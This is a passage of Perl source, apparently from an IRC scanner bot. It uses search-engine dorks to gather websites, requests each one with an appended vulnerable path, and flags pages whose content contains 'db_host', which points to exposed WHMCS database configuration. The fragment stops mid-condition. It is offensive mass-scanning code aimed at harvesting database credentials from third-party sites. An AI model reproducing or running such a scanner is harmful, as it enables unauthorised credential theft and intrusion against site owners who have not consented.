 	my $chan = $_[0];\
	my $bug  = $_[1];\
	my $dork = $_[2];\
	my $engine = $_[3];\
	my $count = 0;\
	my @list = &search_engine($chan,$bug,$dork,$engine,$whmcslogo);\
	my $num = scalar(@list);\
	if($num > 0) \{\
		foreach my $site(@list) \{\
			$count++;\
            if ($count == $num-1) \{ &msg("$chan","$whmcslogo9$engine 4<9=4>15 Scan finish..."); \}\
			my $test1 = "http://".$site.$bug;\
			my $html = get_content($test1);\
			if ($html =~ /db_host/i) \{\
